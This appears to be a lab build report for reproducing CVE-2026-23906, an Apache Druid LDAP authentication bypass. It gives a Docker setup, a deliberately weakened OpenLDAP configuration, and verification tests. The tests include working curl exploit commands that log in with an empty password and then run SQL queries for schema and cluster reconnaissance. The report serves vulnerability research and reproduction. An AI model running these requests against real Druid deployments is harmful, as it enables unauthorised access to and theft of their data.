# Lab Build Report: CVE-2026-23906

## Apache Druid LDAP Authentication Bypass via Empty Password

---

## Lab Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│                     Docker Network: lab-net                       │
│                                                                   │
│  ┌─────────────────┐  ┌─────────────────┐  ┌──────────────────┐ │
│  │    PostgreSQL    │  │    ZooKeeper    │  │     OpenLDAP     │ │
│  │  postgres:16     │  │  zookeeper:3.5  │  │ osixia/openldap  │ │
│  │  Port 5432       │  │  Port 2181      │  │  1.4.0 (custom)  │ │
│  │  Metadata store  │  │  Coordination   │  │  Port 389        │ │
│  └────────┬────────┘  └────────┬────────┘  │  bind_anon_dn=on │ │
│           │                    │            └────────┬─────────┘ │
│  ┌────────┴────────────────────┴─────────────────────┴─────────┐ │
│  │              Apache Druid 35.0.0 Cluster                     │ │
│  │  ┌─────────────┐ ┌────────┐ ┌──────────┐ ┌───────────────┐ │ │
│  │  │ Coordinator │ │ Broker │ │Historical│ │MiddleManager  │ │ │
│  │  │  Port 8081  │ │  8082  │ │   8083   │ │    8091       │ │ │
│  │  └─────────────┘ └────────┘ └──────────┘ └───────────────┘ │ │
│  │  ┌──────────────────────────────────────────────────────┐   │ │
│  │  │           Router (ATTACK SURFACE)                     │   │ │
│  │  │           Port 8888 — LDAP auth enabled               │   │ │
│  │  │           Port 8888 mapped to host                     │   │ │
│  │  └──────────────────────────────────────────────────────┘   │ │
│  └─────────────────────────────────────────────────────────────┘ │
│                              ↑                                    │
│                    Attack vector:                                 │
│             curl -u "admin:" :8888/status                        │
└──────────────────────────────────────────────────────────────────┘
```

---

## Container Details

| Container | Image | Service | Internal Port | Network(s) |
|---|---|---|---|---|
| `cve-2026-23906-openldap` | `cve-2026-23906-openldap` (custom) | OpenLDAP directory server | 389 | lab-net |
| `cve-2026-23906-postgres` | `postgres:16` | Druid metadata storage | 5432 | lab-net |
| `cve-2026-23906-zookeeper` | `zookeeper:3.5.10` | Druid coordination | 2181 | lab-net |
| `cve-2026-23906-coordinator` | `apache/druid:35.0.0` | Druid Coordinator | 8081 | lab-net |
| `cve-2026-23906-broker` | `apache/druid:35.0.0` | Druid Broker | 8082 | lab-net |
| `cve-2026-23906-historical` | `apache/druid:35.0.0` | Druid Historical | 8083 | lab-net |
| `cve-2026-23906-middlemanager` | `apache/druid:35.0.0` | Druid MiddleManager | 8091 | lab-net |
| `cve-2026-23906-router` | `apache/druid:35.0.0` | Druid Router (**target**) | 8888 | lab-net |

### Target Container

- **Container**: `cve-2026-23906-router`
- **Service**: Apache Druid Router 35.0.0
- **Port**: 8888 (HTTP, mapped to host)
- **Access**: `curl http://localhost:8888/...`

---

## Build Status

| Component | Status | Notes |
|---|---|---|
| OpenLDAP (custom image) | ✅ Built & Healthy | Custom Dockerfile bakes in LDIF + enables `bind_anon_dn` at runtime |
| PostgreSQL | ✅ Running & Healthy | Standard postgres:16 with auto-created `druid` database |
| ZooKeeper | ✅ Running & Healthy | Standard zookeeper:3.5.10, healthcheck via AdminServer API |
| Druid Coordinator | ✅ Running | Running under amd64 emulation on arm64 host |
| Druid Broker | ✅ Running | Running under amd64 emulation on arm64 host |
| Druid Historical | ✅ Running | Running under amd64 emulation on arm64 host |
| Druid MiddleManager | ✅ Running | Running under amd64 emulation on arm64 host |
| Druid Router | ✅ Running | Running under amd64 emulation on arm64 host, port 8888 mapped to host |

---

## LDAP Configuration

### Users (from bootstrap.ldif)

| DN | UID | Password | Role |
|---|---|---|---|
| `uid=admin,ou=Users,dc=example,dc=org` | admin | priest | Admin |
| `uid=druid_system,ou=Users,dc=example,dc=org` | druid_system | warlock | System |

### OpenLDAP Configuration

- **Base DN**: `dc=example,dc=org`
- **Admin DN**: `cn=admin,dc=example,dc=org` (password: `admin`)
- **Anonymous binds**: Allowed (default)
- **Unauthenticated binds (DN + empty password)**: **Enabled** via `olcAllows: bind_anon_dn` — this is the prerequisite for the vulnerability

### Druid LDAP Auth Configuration

Key environment variables set in the `environment` file:
```
druid_auth_authenticatorChain=["ldap"]
druid_auth_authenticator_ldap_credentialsValidator_type=ldap
druid_auth_authenticator_ldap_credentialsValidator_url=ldap://cve-2026-23906-openldap:389
druid_auth_authenticator_ldap_credentialsValidator_bindUser=cn=admin,dc=example,dc=org
druid_auth_authenticator_ldap_credentialsValidator_bindPassword=admin
druid_auth_authenticator_ldap_credentialsValidator_baseDn=ou=Users,dc=example,dc=org
druid_auth_authenticator_ldap_credentialsValidator_userSearch=(&(uid=%s)(objectClass=inetOrgPerson))
```

---

## Start/Stop Commands

```bash
# Start the lab
docker compose up -d

# Check status
docker compose ps

# View logs
docker compose logs

# Stop the lab
docker compose down

# Full reset (remove volumes)
docker compose down -v
```

---

## Verification Results

### Test 1: Normal auth (admin:priest) → **200 OK** ✅
```bash
curl -u admin:priest http://localhost:8888/status
# Returns: {"version":"35.0.0","modules":[...]}
```

### Test 2: Wrong password (admin:wrongpassword) → **401 Unauthorized** ✅
```bash
curl -u admin:wrongpassword http://localhost:8888/status
# Returns: HTTP ERROR 401 User authentication failed.
```

### Test 3: EXPLOIT — Empty password (admin:) → **200 OK** ✅ VULNERABILITY CONFIRMED
```bash
curl -u "admin:" http://localhost:8888/status
# Returns: {"version":"35.0.0","modules":[...]}
```

### Test 4: No auth → **401 Unauthorized** ✅
```bash
curl http://localhost:8888/status
# Returns: HTTP ERROR 401 User authentication failed.
```

### Test 5: Data exfiltration via SQL → **Success** ✅
```bash
curl -u "admin:" -X POST http://localhost:8888/druid/v2/sql \
  -H "Content-Type: application/json" \
  -d '{"query":"SELECT * FROM INFORMATION_SCHEMA.SCHEMATA"}'
# Returns: Full schema listing (druid, INFORMATION_SCHEMA, lookup, sys, view)
```

### Test 6: Cluster reconnaissance → **Success** ✅
```bash
curl -u "admin:" -X POST http://localhost:8888/druid/v2/sql \
  -H "Content-Type: application/json" \
  -d '{"query":"SELECT * FROM sys.servers"}'
# Returns: Full server listing (coordinator, broker, historical, middlemanager, router)
```

### Test 7: druid_system user bypass → **200 OK** ✅
```bash
curl -u "druid_system:" http://localhost:8888/status
# Returns: 200 OK — system user also bypassed
```

---

## Lab Files

| File | Purpose |
|---|---|
| `docker-compose.yml` | Orchestrates all 8 containers (OpenLDAP, PostgreSQL, ZooKeeper, 5x Druid services) |
| `Dockerfile.openldap` | Custom OpenLDAP image with baked-in bootstrap LDIF and unauthenticated bind entrypoint |
| `openldap-entrypoint.sh` | Custom entrypoint that enables `olcAllows: bind_anon_dn` after slapd starts |
| `environment` | Druid environment variables including LDAP auth configuration |
| `ldap-configs/bootstrap.ldif` | LDAP directory initialization with test users (admin, druid_system) |
| `allow-anon-bind.ldif` | LDIF for enabling unauthenticated binds (reference — applied by entrypoint) |

---

## Workarounds Applied

1. **OpenLDAP LDIF injection**: The OpenLDAP container needs custom LDIF files and an entrypoint. Solved by building a custom Docker image (`Dockerfile.openldap`) that bakes in the LDIF files with `COPY`.

2. **OpenLDAP unauthenticated bind**: By default, `osixia/openldap:1.4.0` disallows "unauthenticated binds" (DN + empty password). The CVE requires this to succeed. Solved with a custom entrypoint (`openldap-entrypoint.sh`) that applies `olcAllows: bind_anon_dn` via `ldapmodify` after slapd starts.

3. **ZooKeeper healthcheck**: The `nc` command isn't available in the ZooKeeper 3.5.10 container. Used the AdminServer HTTP API (`http://localhost:8080/commands/ruok`) for health checking instead.

4. **OpenLDAP healthcheck**: Anonymous binds can't read the base DN. Changed healthcheck to use an unauthenticated bind (DN + empty password) which tests both server readiness AND that the bind_anon_dn config has been applied.

5. **Platform mismatch**: The `apache/druid:35.0.0` image is linux/amd64 only. Running under QEMU emulation on the arm64 host — works correctly but with slower startup times (~30s).

---

## Known Issues

- **ARM64 emulation**: All Druid containers run under amd64→arm64 QEMU emulation, which is slower than native execution. Initial startup takes ~30 seconds. This does not affect vulnerability reproduction.
- **Port mapping**: The Druid Router is the only service exposed to the host (port 8888). All other services communicate internally via the lab-net Docker network.
